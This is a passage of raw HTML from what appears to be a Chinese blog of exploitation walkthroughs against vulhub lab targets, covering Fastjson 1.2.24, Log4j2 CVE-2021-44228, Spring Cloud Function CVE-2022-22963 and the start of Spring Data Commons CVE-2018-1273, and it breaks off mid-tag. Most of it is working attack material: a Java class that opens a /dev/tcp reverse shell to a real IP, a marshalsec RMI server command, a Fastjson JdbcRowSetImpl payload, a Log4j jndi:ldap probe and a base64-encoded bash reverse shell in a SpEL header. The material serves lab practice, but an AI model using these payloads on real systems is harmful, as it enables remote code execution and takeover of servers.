style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;exec 5&lt;&gt;/dev/tcp/47.113.187.190/9000;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">});</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> InputStream </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">is</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> = p.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">getInputStream</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">BufferedReader reader = new </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">BufferedReader</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(new </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">InputStreamReader</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">is</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)); </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">String line; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">while</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">((line = reader.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">readLine</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">!=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> null) { </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">System.out.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(line); </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">p.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">waitFor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(); </span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">is</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">close</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(); </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">reader.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">close</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(); </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">p.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">destroy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(); </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">public static void </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(String[] args) throws </span><span style="--shiki-light:#0184BC;--shiki-dark:#ABB2BF;">Exception</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.2编译： javac GetShell.java ==&gt; GetShell.class</p><p>​<img src="'+R+'" alt="image" loading="lazy">​</p><p>2.3 开启HTTP服务 这里我直接丢到之前我网站的web根目录下了，访问直接下载。</p><p>​<img src="'+H+'" alt="image" loading="lazy">​</p><p>也可以用 python -m http.server 90 在本机当前目录下开启。需要python环境。</p></li><li><h5 id="开启rmi服务" tabindex="-1"><a class="header-anchor" href="#开启rmi服务"><span>开启RMI服务</span></a></h5><p>执行目录下需要有 <span data-type="text" style="color:var(--b3-font-color9);">marshalsec-0.0.3-SNAPSHOT-all.jar </span>，ip地址为第二步恶意类的http服务地址#后面跟上编译后的类名。 9000为RMI服务端口。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">java </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">cp marshalsec</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.3</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SNAPSHOT</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">all</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.jar marshalsec.jndi.RMIRefServer </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://47.113.187.190:90/#GetShell&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 9000</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+I+'" alt="image" loading="lazy">​</p></li><li><h5 id="反弹shell端口监听" tabindex="-1"><a class="header-anchor" href="#反弹shell端口监听"><span>反弹shell端口监听</span></a></h5><p>此处监听的主机和端口要和 创建恶意类 GetShell.java 中所写的一直。</p><p>​<img src="'+M+'" alt="image" loading="lazy">​</p><p><span data-type="text" style="color:var(--b3-font-color9);">坑：shell可以反弹了这里好像不容易看出，建议输入shell看能不能出来。</span></p></li><li><h5 id="burpsuite抓包请求" tabindex="-1"><a class="header-anchor" href="#burpsuite抓包请求"><span>Burpsuite抓包请求</span></a></h5><p><span data-type="text" style="color:var(--b3-font-color9);">坑：请求包建议复制粘贴全换，然后改ip。payload来源</span>：<a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/" target="_blank" rel="noopener noreferrer">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a> <code>rmi://111.67.196.133:9000/GetShell1</code>​为启动了RMI服务的主机和端口，GetShell 为恶意类名。前后要一致。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">POST</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> HTTP</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1.1</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Host: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">47.113</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.187.190:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8090</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding: gzip, deflate</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept: </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*/*</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Language: en</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">User</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Agent: Mozilla</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (compatible; </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">MSIE</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 9.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; Windows </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">NT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 6.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; Win64; x64; Trident</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Connection: close</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Content</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Type: application</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">json</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Content</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Length: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">164</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;b&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:{</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &quot;@type&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &quot;dataSourceName&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;rmi://111.67.196.133:9000/GetShell1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        &quot;autoCommit&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:true</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送后，RMI服务器响应。</p><p>​<img src="'+V+'" alt="image" loading="lazy">​</p><p>getshell</p><p>​<img src="'+O+'" alt="image" loading="lazy">​</p></li></ol><h1 id="apache-log4j2-查找功能-jndi-注入-cve-2021-44228" tabindex="-1"><a class="header-anchor" href="#apache-log4j2-查找功能-jndi-注入-cve-2021-44228"><span>Apache Log4j2 查找功能 JNDI 注入 （CVE-2021-44228）</span></a></h1><h3 id="使用dnslog回显" tabindex="-1"><a class="header-anchor" href="#使用dnslog回显"><span>使用dnslog回显</span></a></h3><ol><li><p>查看服务是否正常启动​<img src="'+N+'" alt="image" loading="lazy">​</p></li><li><p><a href="http://47.113.187.190:8983/solr/admin/cores?action=1" target="_blank" rel="noopener noreferrer">http://47.113.187.190:8983/solr/admin/cores?action=1</a> 将路径写到这里再进行抓包。​<img src="'+U+'" alt="image" loading="lazy">​</p></li><li><p>​<img src="'+G+'" alt="image" loading="lazy">​</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">GET</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">solr</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">admin</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">cores</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">action</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{jndi:ldap:</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">//</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{sys:java.version}.7de9cdad.log.dnslog.biz.} </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">HTTP</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1.1</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Host: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">47.113</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.187.190:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8983</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">User</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Agent: Mozilla</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Windows </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">NT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; Win64; x64; rv:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">130.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) Gecko</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">20100101</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Firefox</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">130.0</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept: text</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">html,application</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xhtml</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml,application</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.9</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">avif,image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">webp,image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">png,image</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">svg</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*/*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.8</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Language: zh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">CN</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,zh;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,zh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">TW</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.7</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,zh</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">HK</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,en</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">US</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,en;q</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0.2</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding: gzip, deflate, br</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Connection: close</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Upgrade</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Insecure</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Requests: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Priority: u</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, i</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>​<img src="'+W+'" alt="image" loading="lazy">​​​</p></li></ol><h1 id="spring-cloud-function-spel-代码注入-cve-2022-22963" tabindex="-1"><a class="header-anchor" href="#spring-cloud-function-spel-代码注入-cve-2022-22963"><span>Spring Cloud Function SpEL 代码注入 （CVE-2022-22963）</span></a></h1><p>请求标头中有 SpEL 表达式注入。<code>spring.cloud.function.routing-expression</code>​</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">POST</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">functionRouter </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">HTTP</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1.1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    #这里要修改</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Host: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">47.113</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.187.190:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">8000</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Encoding: gzip, deflate</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept: </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">*/*</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Accept</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Language: en</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">User</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Agent: Mozilla</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">5.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (Windows </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">NT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; Win64; x64) AppleWebKit</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">537.36</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">KHTML</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, like Gecko) Chrome</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">97.0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.4692.71 Safari</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">537.36</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Connection: close</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Upgrade</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Insecure</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Requests: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">spring.cloud.function.routing</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">expression: </span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">T</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(java.lang.Runtime).</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">getRuntime</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMTg3LjE5MC85MDAwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Content</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Type: text</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">plain   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#添加语句</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Content</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Length: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">test</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>修改后发送</p><p>​<img src="'+J+'" alt="image" loading="lazy">​</p><p>上方getshell的代码可来源此</p><p>​<img src="'+$+'" alt="image" loading="lazy">​</p><p>shell监听9000返回。</p><p>​<img src="'+Z+'" alt="image" loading="lazy">​</p><h1 id="spring-data-commons-远程命令执行漏洞-cve-2018-1273" tabindex="-1"><a class="header-anchor" href="#spring-data-commons-远程命令执行漏洞-cve-2018-1273"><span>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</span></a></h1><ol><li><p>安装靶场环境</p><p>​<img src="'+K+'" alt="image" loading="lazy">​</p></li><li><p>访问漏洞所在页面</p><p><a href="http://47.113.187.190:22375/users" target="_blank" rel="noopener 